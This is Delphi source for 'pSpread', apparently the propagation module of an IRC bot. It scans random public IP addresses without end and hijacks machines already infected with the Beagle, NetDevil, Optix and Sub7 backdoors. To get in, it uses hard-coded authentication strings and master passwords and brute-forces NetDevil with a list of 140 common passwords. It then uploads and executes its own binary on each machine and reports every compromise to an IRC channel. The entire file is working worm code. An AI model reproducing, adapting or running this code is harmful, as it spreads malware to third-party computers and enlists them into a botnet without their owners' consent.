   unit pSpread;

   interface

   uses
     Windows, Winsock, pBot;

   Type
     TIPs        = ARRAY[0..10] OF STRING;

   var
     IPs        : TIPs;
     BeagleAuth1: String = #$43#$FF#$FF#$FF#$30#$30#$30#$01#$0A#$1F#$2B#$28#$2B#$A1#$32#$01;
     BeagleAuth2: String = #$43#$FF#$FF#$FF#$30#$30#$30#$01#$0A#$28#$91#$A1#$2B#$E6#$60#$2F#$32#$8F#$60#$15#$1A#$20#$1A;

     Password: Array[0..139] Of String = (
           '',     'administrator',    'administrador','administrateur',   'administrat',
           'admins',   'admin',        'adm',      'password1',        'password',
           'passwd',   'pass1234',     'pass',     'pwd',          '007',
           '1',        '12',           '123',      '1234',         '12345',
           '123456',   '1234567',      '12345678', '123456789',        '1234567890',
           '2000',     '2001',         '2002',     '2003',         '2004',
           'test',     'guest',        'none',     'demo',         'unix',
           'linux',    'changeme',     'default',  'system',       'server',
           'root',     'null',         'qwerty',   'mail',         'outlook',
           'web',      'www',          'internet', 'accounts',     'accounting',
           'home',     'homeuser',     'user',     'oem',          'oemuser',
           'oeminstall',   'windows',      'win98',    'win2k',        'winxp',
           'winnt',    'win2000',      'qaz',      'asd',          'zxc',
           'qwe',      'bob',          'jen',      'joe',          'fred',
           'bill',     'mike',         'john',     'peter',        'luke',
           'sam',      'sue',          'susan',    'peter',        'brian',
           'lee',      'neil',         'ian',      'chris',        'eric',
           'george',   'kate',         'bob',      'katie',        'mary',
           'login',    'loginpass',        'technical',    'backup',       'exchange',
           'fuck',     'bitch',        'slut',     'sex',          'god',
           'hell',     'hello',        'domain',   'domainpass',       'domainpassword',
           'database', 'access',       'dbpass',   'dbpassword',       'databasepass',
           'data',     'databasepassword', 'db1',      'db2',          'db1234',
           'sa',       'sql',          'sqlpass',  'oainstall',        'orainstall',
           'oracle',   'ibm',          'cisco',    'dell',         'compaq',
           'siemens',  'hp',           'nokia',    'xp',           'control',
           'office',   'blank',        'winpass',  'main',         'lan',
           'internet', 'intranet',     'student',  'teacher',      'staff');


     Procedure DoBeagle;
     Procedure DoNetDevil;
     Procedure DoOptix;
     Procedure DoSub7;

   implementation

   Procedure SendData(Text: String);
   Begin
     Send(BotSock, Text[1], Length(Text), 0);
   End;

   function StrtoInt(const S: string): integer; var
   E: integer; begin Val(S, Result, E); end;

   function InttoStr(const Value: integer): string;
   var S: string[11]; begin Str(Value, S); Result := S; end;

   PROCEDURE GetIPs(VAR IPs:TIPS;VAR NumberOfIPs:BYTE);
   TYPE
     TaPInAddr = ARRAY [0..10] OF PInAddr;
     PaPInAddr = ^TaPInAddr;
   VAR
     phe       : PHostEnt;
     pptr      : PaPInAddr;
     Buffer    : ARRAY [0..63] OF Char;
     I         : Integer;
     GInitData : TWSAData;
   BEGIN
     WSAStartup($101,GInitData);
     GetHostName(Buffer,SizeOf(Buffer));
     phe:=GetHostByName(Buffer);
     IF phe=NIL THEN Exit;
     pPtr:=PaPInAddr(phe^.h_addr_list);
     I:=0;
     WHILE pPtr^[I]<>NIL DO BEGIN
       IPs[I]:=inet_ntoa(pptr^[I]^);
       NumberOfIPs:=I;
       Inc(I);
     END;
     WSACleanup;
   END;

   Function GetIP: String;
   VAR
     NumberOfIPs : Byte;
     I           : Byte;
     IP          : STRING;
   Begin
     GetIPs(IPs,NumberOfIPs);
     FOR I:=0 TO NumberOfIPs DO
       IP:=IPs[I];
     Result := IP;
   End;

   Function Beagle(IP: string; Version: Integer): bool;
   var
     BeagleAuth: String;
     Buffer: Array[0..8] Of Char;
     BotFile: String;
     FName: String;
     Ext: String;

     WSAData: TWSAData;
     Success: Bool;

     Sock: TSocket;
     Addr: TSockAddrIn;
   begin
     Success := False;

     WSAStartUp(MakeWord(1,1), WSAData);
     Sock := Socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

     Addr.sin_family := AF_INET;
     Addr.sin_port := hTons(2745);
     Addr.sin_addr.S_addr := inet_addr(pchar(IP));

     If Connect(Sock, Addr, SizeOf(Addr)) = ERROR_SUCCESS Then
     Begin
       Case Version Of
         1: BeagleAuth := BeagleAuth1;
         2: BeagleAuth := BeagleAuth2;
       End;

       If Send(Sock, BeagleAuth[1], Length(BeagleAuth), 0) <> SOCKET_ERROR Then
       Begin
         If Recv(Sock, Buffer, 8, 0) <> SOCKET_ERROR Then
         Begin
           Randomize;
           BotFile := 'http://'+GetIP+':81/'+inttostr(random(9))+inttostr(random(9))+inttostr(random(9))+'.exe';
           If Send(Sock, BotFile[1], Length(BotFile), 0) <> SOCKET_ERROR Then Success := True;
         End;
       End;
     End;

     CloseSocket(Sock);
     WsaCleanUp();

     If Success Then
     Begin
       SendData('PRIVMSG '+botchan+' :[Beagle'+IntToStr(Version)+']Exploited '+IP+#10);
     End;
   end;

   Function NetDevil_Receive(Sock: TSocket): Integer;
   Var
     TimeOut: TimeVal;
     Fd_Struct: TFDSet;
   Begin
     TimeOut.tv_sec := 30;
     TimeOut.tv_usec := 0;

     FD_ZERO(FD_STRUCT);
     FD_SET(Sock, FD_STRUCT);

     If Select(0, @FD_STRUCT, NIL, NIL, @TIMEOUT) <= 0 Then
     Begin
       CloseSocket(Sock);
       Result := -1;
       Exit;
     End;
     Result := 0;
   End;

   Function NetDevil_Upload(IP: String; Sock: TSocket): Integer;
   Var
     nSock: TSocket;
     Addr : TSockAddrIn;
     WSAData: TWSAData;
     Buffer: Array[0..1024]Of Char;
     BotFile: String;
     rFile: String;

     Port: Integer;
     Bytes_Sent: Integer;
     fSend: Integer;
     fSize: Integer;
     Mov: Integer;

     Mode: DWord;
     ver15: Bool;

     uPort: String;
     ver  : String;
     TestFile: THandle;
     Temp : String;
   Label
     En;
   Begin
     Result := -1;
     fSend := 1024;
     ver15 := False;
     Mode := 0;

     BotFile := ParamStr(0);

     Temp := 'version';
     Send(Sock, Temp[1], 7, 0);
     fillchar(Buffer, SizeOf(Buffer), #0);
     Recv(Sock, Buffer, SizeOf(Buffer), 0);

     If Length(Buffer) > 5 Then
     Begin
       Buffer[Length(Buffer)-2] := '0';
       uPort := Copy(String(Buffer), 1, Pos(#10#13, String(Buffer))-1);
       if uPort <> '' Then Port := hTons(StrToInt(uPort));
     End;

     Ver := Copy(String(Buffer), 1, Pos(#10#13, String(Buffer))-1);
     If String(Buffer) = 'ver1.5' Then Ver15 := True;
     rFile := 'C:\file.exe'; //+filename(?)

     If Port = 0 Then Port := 903;

     // Connection Part
     WsaStartUp(MakeWord(1,1), WSAData);
     nSock := Socket(AF_INET, 1, 0);
     Addr.sin_family := AF_INET;
     Addr.sin_port := hTons(Port);
     Addr.sin_addr.S_addr := inet_addr(pchar(IP));
     If Connect(Sock, Addr, SizeOf(Addr)) = SOCKET_ERROR Then Goto En;

     TestFile := CreateFile(pChar(BotFile), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
     If TestFile = INVALID_HANDLE_VALUE then goto en;

     FSize := GetFileSize(TestFile, NIL);

     If Ver15 Then
       Temp := 'cmd[003]'+rFile+'|'+IntToStr(fSize)+'|'+#10#13
     Else
       Temp := rFile+#13+'1';
     Send(nSock, Temp[1], Length(Temp), 0);
     If Recv(nSock, Buffer, SizeOf(Buffer), 0) < 1 Then Goto En;

     While FSize > 0 Do
     Begin
       FillChar(Buffer, SizeOf(Buffer), #0);
       If (FSend>FSize) Then FSend := FSize;
       Mov := 0-FSize;

       SetFilePointer(TestFile, Mov, NIL, FILE_END);
       ReadFile(TestFile, Buffer, FSend, Mode, NIL);
       Bytes_Sent := Send(nSock, Buffer, FSend, 0);
       If Bytes_Sent = SOCKET_ERROR Then
       Begin
         If WSAGetLastError <> WSAEWOULDBLOCK Then Goto En;
       End Else
         Bytes_Sent := 0;
       FSize := Fsize - Bytes_Sent;

       If (Not Ver15) and (Recv(nSock, Buffer, SizeOf(Buffer), 0) < 1) Then Goto En;
     End;

     If TestFile <> INVALID_HANDLE_VALUE Then CloseHandle(Testfile);
     CloseSocket(nSock);
     Sleep(2000);

     Temp := 'pleaz_run'+rFile;
     Send(Sock, Temp[1], Length(Temp), 0);
     FillChar(Buffer, SizeOf(Buffer), #0);
     If Recv(Sock, Buffer, SizeOf(Buffer), 0) < 1 Then Goto En;
     If String(Buffer) <> 'pleaz_run_done' Then Goto En;

     Sleep(4000);
     CloseSocket(Sock);

     Result := 1;
     WsaCleanUp;
     Exit;
   En:
     CloseSocket( Sock);
     CloseSocket(nSock);
     WsaCleanUp;
   End;

   Function NetDevil(IP: String): Bool;
   Var
     Buffer: Array[0..4000] Of Char;
     Mode  : Integer;
     Sock  : TSocket;
     Addr  : TSockAddrIn;
     I     : Integer;
     Temp  : String;
     Wsa   : TWSAData;
   Begin
     Result := False;
     WSAStartUp(MakeWord(2,2), WSA);
     Sock := Socket(AF_INET, SOCK_STREAM, 0);
     If Sock = INVALID_SOCKET Then Exit;

     Addr.Sin_Family := AF_INET;
     Addr.Sin_Addr.S_addr := inet_Addr(pchar(ip));
     Addr.sin_port := hTons(903);

     Mode := 0;
     Connect(Sock, Addr, SizeOf(Addr));
     IOCTLSocket(Sock, FIONBIO, Mode);

     For I := 0 To 139 Do
     Begin
       Sleep(50);
       FillChar(Buffer, SizeOf(Buffer), #0);

       If NetDevil_Receive(Sock) = -1 Then
         Break;
       If Recv(Sock, Buffer, SizeOf(BuffeR), 0) <= 0 Then
         Break;
       If String(Buffer) = 'passed' Then
       Begin
         Temp := 'nd '+IP+' '+Password[i-1];
         Send(Sock, Temp[1], Length(Temp), 0);

         If NetDevil_Upload(IP, Sock) = 1 Then
         Begin
           CloseSocket(Sock);
           Result := True;
           SendData('PRIVMSG '+BotChan+' :[NetDevil]Exploited '+IP+#10);
         End;
         Break;
       End;
       If String(Buffer) = 'pass_pleaz' Then
       Begin
         Temp := 'pass_pleaz'+Password[i];
         Send(Sock, Temp[1], Length(Temp), 0);
         Continue;
       End Else Break;
     End;
     CloseSocket(Sock);
     WSACleanUp;
   End;

   Function Optix(IP: String): Bool;
   Var
     Buffer: Array[0..4000] Of Char;
     szBuffer: Array[0..64] Of Char;
     szFilePath: String;

     Read   : Cardinal; {0}
     WSAData: TWSAData;
     UPLData: TWSAData;
     Addr   : TSockAddrIn;
     Upl    : TSockAddrIn;
     Sock   : TSocket;
     uSock  : TSocket;

     IS11   : Bool; {False}
     Temp   : String;
     F      : THandle;
     hFile  : THandle;
     dwSize : Dword;
     Read_Bytes: DWord;
   Label
     Start;
   Begin
     Result := False;
     If WSAStartUp(MakeWord(2,2), WSAData) <> 0 Then Exit;

     Addr.sin_addr.S_addr := inet_addr(pchar(ip));
     Addr.sin_port := hTons(3140);
     Addr.sin_family := AF_INET;

     Sock := SOcket(AF_INET, SOCK_STREAM, 0);

   Start:
     If Connect(Sock, Addr, SizeOf(Addr)) = SOCKET_ERROR Then
     Begin
       CloseSocket(Sock);
       WsaCleanUp;
       Exit;
     End;

     // Auth
     // Note: OPTIX blocks your connection if you fail the password three times.

     If (IS11) Then
       Temp := '022¬¬v1.1'#13#10
     Else
       Temp := '022¬¬v1.2'#13#10;
     Send(Sock, Temp[1], Length(Temp), 0);
     Sleep(500);

     FillChar(szBuffer, SizeOf(szBuffer), #0);
     Recv(Sock, szBuffer, SizeOf(szBuffer), 0);

     If Pos('001¬Your client version is outdated!',String(szBuffer)) > 0 Then
     Begin
       IS11 := True;
       CloseSocket(Sock);
       Goto Start;
     End;

     If Pos('001¬',String(szBuffer)) > 0 Then
     Begin
       Sleep(500);
       // If "OPTest" doesnt work, try a empty password.

       If (IS11) Then
         Temp := '022¬¬v1.1'#13#10
       Else
         Temp := '022¬¬v1.2'#13#10;
       Send(Sock, Temp[1], Length(Temp), 0);
       Sleep(500);

       FillChar(szBuffer, SizeOf(szBuffer), #0);
       Recv(Sock, szBuffer, SizeOf(szBuffer), 0);
       If Pos('001¬', String(szBuffer)) > 0 Then
       Begin
         CloseSocket(Sock);
         WSACleanUp;
         Exit;
       End;
     End;

     Temp := '019¬'#13#10;
     Send(Sock, Temp[1], 6, 0);
     Sleep(500);

     FillChar(szBuffer, SizeOf(szBuffer), #0);
     Recv(Sock, szBuffer, SizeOf(szBuffer), 0);

     If Pos('020¬'#13#10, String(szBuffer)) > 0 Then
     Begin
       CloseSocket(Sock);
       WSACleanUp;
       Exit;
     End;

     szFilePath := ParamStr(0);
     F := CreateFile(pChar(szFilePath), GENERIC_READ, FILE_SHARE_READ, NIL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

     If WSAStartUp(MakeWord(2,2), UPLData) <> 0 Then
     Begin
       CloseSocket(Sock);
       WSACleanUp;
       Exit;
     End;

     upl.sin_addr.s_addr := inet_addr(pchar(ip));
     upl.sin_port := htons(500);
     upl.sin_family := af_inet;

     uSock := Socket(AF_INET, Sock_Stream, 0);

     If Connect(uSock, Upl, SizeOf(Upl)) = SOCKET_ERROR Then
     Begin
       CloseSocket( Sock);
       CloseSocket(uSock);
       WSACleanUp;
       Exit;
     End;

     hFile := CreateFile(pChar(szFilePath), GENERIC_READ, FILE_SHARE_READ, NIL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
     dwSize := GetFileSize(hFile, 0);
     CloseHandle(hFile);

     Temp := 'C:\a.exe'#13#10+inttostr(dwSize)+#13#10;
     Send(uSock, Temp[1], Length(Temp), 0);
     Sleep(500);

     FillChar(szBuffer, SizeOf(szBuffer), #0);
     Recv(uSock, szBuffer, SizeOf(szBuffer), 0);

     If Pos('+OK REDY', String(szBuffer)) = 0 Then
     Begin
       CloseSocket( Sock);
       CloseSocket(uSock);
       WSACleanUp;
       Exit;
     End;

     FillChar(szBuffer, SizeOf(szBuffer), #0);

     Read := 0;
     Repeat
       ReadFile(F, szBuffer, SizeOf(szBuffer), Read, 0);
       Send(uSock, szBuffer, Read, 0);
     Until read = 0;
     CloseHandle(F);

     FillChar(szBuffer, SizeOf(szBuffer), #0);
     Recv(uSock, szBuffer, SizeOf(szBuffer), 0);

     If Pos('+OK RCVD', string(szBuffer)) > 0 Then
     Begin
       CloseSocket(uSock);
       Temp := '008¬C:\a.exe'#13#10;
       Send(Sock, Temp[1], 14, 0);
       Sleep(500);

       FillChar(szBuffer, SizeOf(szBuffer), #0);
       Recv(Sock, szBuffer, SizeOf(szBuffer), 0);
       If (String(szBuffer) = '001¬Error Executing File'#13#10) Then
       Begin
         CloseSocket( Sock);
         CloseSocket(uSock);
         WSACleanUp;
         Exit;
       End;
     End Else
     Begin
       CloseSocket( Sock);
       CloseSocket(uSock);
       WSACleanUp;
       Exit;
     End;

     Temp := '100¬'#13#10;
     Send(Sock, Temp[1], Length(Temp), 0);
     CloseSocket( Sock);
     CloseSocket(uSock);
     WSACleanUp;

     SendData('PRIVMSG '+botchan+' :[OPTIX]Exploited '+IP+#10);
     Result := True;
   End;

   Function Sub7_Receive(sSock: TSocket): integer;
   Var
     TimeOut: TimeVal;
     Fd_Struct: TFDSet;
   Begin
     TimeOut.tv_sec := 30;
     TimeOut.tv_usec := 0;

     FD_ZERO(FD_STRUCT);
     FD_SET(sSock, FD_STRUCT);

     If Select(0, @FD_STRUCT, NIL, NIL, @TIMEOUT) <= 0 Then
     Begin
       CloseSocket(sSock);
       Result := -1;
       Exit;
     End;
     Result := 0;
   End;

   Function Sub7(IP: String): Bool;
   Var
     Buffer : Array[0..4000] Of Char;
     Rep    : Integer;
     C      : Cardinal;
     Mode   : Integer;
     Mode2  : DWord;
     sSock  : TSocket;
     Addr   : TSockAddrIn;
     Temp   : String;

     BotFile : Array[0..MAX_PATH] Of Char;
     tmpBuf  : Array[0..1041] Of Char;
     TestFile: THandle;
     Size    : Integer;
     inFile  : THandle;
     Err     : DWord;
     Wsa     : TWSAData;
   Label
     En, Restart;
   Begin

     Mode := 0;
     Mode2:= 0;
     Rep := 0;

     WSAStartUp(MakeWord(2,2), WSA);

     Result := False;
     sSock := Socket(AF_INET, 1, 0);
     If sSock = INVALID_SOCKET Then Exit;

     Addr.sin_family := AF_INET;
     Addr.sin_port := hTons(27347);
     Addr.sin_addr.S_addr := inet_addr(pchar(ip));

     Connect(sSock, Addr, SizeOf(Addr));
     IOCTLSocket(sSock, FIONBIO, Mode);

   Restart:
     FillChar(Buffer, SizeOf(Buffer), #0);
     If Sub7_Receive(sSock) = -1 Then Goto En;
     If Recv(sSock, Buffer, SizeOf(Buffer), 0) <= 0 Then Goto En;

     If String(Buffer) = 'PWD' Then
     Begin
       If Rep > 1 Then Goto En
       Else
       Begin
         If Rep = 0 Then Temp := 'PWD715' Else Temp := 'PWD14438136782715101980';
         Inc(Rep);
         If Send(sSock, Temp[1], Length(Temp), 0) <= 0 Then Goto En;
         Goto Restart;
       End;
     End;

     If Pos('connected.', String(Buffer)) > 0 Then
     Begin
       Temp := 'UPS';
       Send(sSock, Temp[1], Length(Temp), 0);

       FillChar(Buffer, SizeOf(Buffer), #0);
       If Sub7_Receive(sSock) = -1 Then Goto En;
       Recv(sSock, Buffer, SizeOf(Buffer), 0);
       If String(Buffer) <> 'TID' Then Goto En;

       GetModuleFileName(0, BotFile, SizeOf(BotFile));
       TestFile := CreateFile(BotFile, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
       If TestFile = INVALID_HANDLE_VALUE Then Goto En;
       Size := GetFileSize(TestFile, NIL);
       CloseHandle(TestFile);

       Temp := 'SFT05'+IntToStr(Size);
       Send(sSock, Temp[1], Length(Temp), 0);

       inFile := CreateFile(BotFile, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
       While True Do
       Begin
         FillChar(tmpBuf, SizeOf(tmpBuf), 0);
         ReadFile(inFile, tmpBuf, 1, C, NIL);
         If C = 0 Then Break;
         If Send(sSock, tmpBuf, SizeOf(tmpBuf), 0) <= 0 Then
         Begin
           CloseHandle(inFile);
           Goto En;
         End;
       End;
       CloseHandle(inFile);
       C := 0;

       Err := Recv(sSock, Buffer, SizeOf(Buffer), 0);
       While Err > 0 Do
       Begin
         If ((C > 3) or (Sub7_Receive(sSock) = -1)) Then Break;
         Err := Recv(sSock, Buffer, SizeOf(Buffer), 0);
         Inc(C);
       End;
       CloseSocket(sSock);
       // IRCLOG
       Result := True;
     End Else If (Rep = 1) Then
     Begin
       CloseSocket(sSock);
       Sleep(2000);
       sSock := Socket(AF_INET, 1, 0);
       If sSock = INVALID_SOCKET Then Exit;

       Addr.sin_family := AF_INET;
       Addr.sin_port := hTons(27347);
       Addr.sin_addr.S_addr := inet_addr(pchar(ip));

       Connect(sSock, Addr, SizeOf(Addr));
       IOCTLSocket(sSock, FIONBIO, Mode);
       Goto Restart;
     End;
     If Result Then
     Begin
       SendData('PRIVMSG '+BotChan+' :[SUB7]Exploited '+IP+#10);
     End;
     Exit;
   En:
     CloseSocket(sSock);
     WsaCleanUp;
   End;

   Procedure DoSub7;
   Begin
     Repeat
       Sub7(IntToStr(Random(222)+1)+'.'+IntToStr(Random(255)+1)+'.'+IntToStr(Random(255)+1)+'.'+IntToStr(Random(255)+1));
     Until 1 = 2;
   End;

   Procedure DoOptix;
   Begin
     Repeat
       Optix(IntToStr(Random(222)+1)+'.'+IntToStr(Random(255)+1)+'.'+IntToStr(Random(255)+1)+'.'+IntToStr(Random(255)+1));
     Until 1 = 2;
   End;

   Procedure DoNetDevil;
   Begin
     Repeat
       NetDevil(IntToStr(Random(222)+1)+'.'+IntToStr(Random(255)+1)+'.'+IntToStr(Random(255)+1)+'.'+IntToStr(Random(255)+1));
     Until 1 = 2;
   End;

   Procedure DoBeagle;
   Begin
     Repeat
       Beagle(IntToStr(Random(222)+1)+'.'+IntToStr(Random(255)+1)+'.'+IntToStr(Random(255)+1)+'.'+IntToStr(Random(255)+1), 1);
       Beagle(IntToStr(Random(222)+1)+'.'+IntToStr(Random(255)+1)+'.'+IntToStr(Random(255)+1)+'.'+IntToStr(Random(255)+1), 2);
     Until 1 = 2;
   End;

   end.
